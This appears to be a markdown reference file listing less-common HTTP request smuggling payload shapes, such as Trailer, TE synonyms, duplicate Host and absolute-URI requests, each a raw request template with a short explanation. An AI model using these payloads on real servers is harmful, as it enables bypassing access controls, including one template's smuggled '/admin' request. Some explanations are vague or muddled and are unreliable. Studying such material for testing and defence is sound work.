# Extended corpus — the less-common shapes

## The `Expect: 100-continue` desync

```text
POST / HTTP/1.1
Host: t
Content-Length: 100
Expect: 100-continue
```

The front sends `100 Continue` → the client sends the body — a
middleware that auto-sends `100 Continue` early shifts the boundary —
the interim-response desync.

## The `Connection: keep-alive` h1.0

```text
POST / HTTP/1.0
Connection: keep-alive
Content-Length: 4

GET /admin HTTP/1.0
```

h1.0 + explicit keep-alive — a front-end that upgrades to h1.1 → the
boundary shifts — `tunneling.md`.

## The `Upgrade: TLS/1.2` — TLS-in-TLS

```text
Upgrade: TLS/1.2
Connection: Upgrade
```

The upgrade negotiates TLS inside the socket — the smuggle inside the
TLS tunnel.

## The `Proxy-Authorization` smuggle

```text
GET / HTTP/1.1
Proxy-Authorization: Basic x
```

The proxy-auth header — a proxy that forwards it to the back-end —
the back-end's auth-trust — the proxy's credential leaks.

## The `Trailer:` header — the post-body headers

```text
POST / HTTP/1.1
Transfer-Encoding: chunked
Trailer: X-Trailer

5c
<data>
0
X-Trailer: smuggled
```

The `Trailer` headers come AFTER the body — a parser that reads them
vs one that drops them — the trailer-desync.

## The `Content-Encoding` desync — gzip-body boundary

```text
POST / HTTP/1.1
Content-Encoding: gzip
Content-Length: 100
```

The compressed body's boundary — a front-end that de-chunks then
re-compresses vs one that forwards — a compression-desync.

## The `Range` smuggle — `Range: bytes=0-100`

```text
GET /file HTTP/1.1
Range: bytes=0-100
```

A range-request's body-boundary — the range-parser's disagreement on
what follows.

## The `Transfer-Encoding: identity` — the no-op TE

```text
Transfer-Encoding: identity
Content-Length: 4
```

`identity` = no encoding — a parser honoring it ignores chunking →
falls back to CL; a parser honoring `chunked`... doesn't exist here —
`identity` is the no-op.

## The `TE` short-form — `TE: chunked`

```text
TE: chunked
```

The short-form header — some proxies honor it as `Transfer-Encoding` —
a name-synonym desync.

## The `Content-Length` in a GET — `GET / CL: 4 body`

```text
GET / HTTP/1.1
Content-Length: 4

A=1&
```

A GET with a body — a parser that reads it vs one that ignores it —
the method-based body-desync.

## The `Host:` duplicate — `Host: a` + `Host: b`

```text
GET / HTTP/1.1
Host: a
Host: b
```

Two Host headers — one parser uses the first, the other the last —
a vhost-smuggle — `internal-routes.md`.

## The absolute-URI — `GET http://internal/path`

```text
GET http://internal/path HTTP/1.1
Host: t
```

The absolute-URI form — a proxy that routes on the URI vs one that
routes on the Host header — the URI-vs-Host desync.
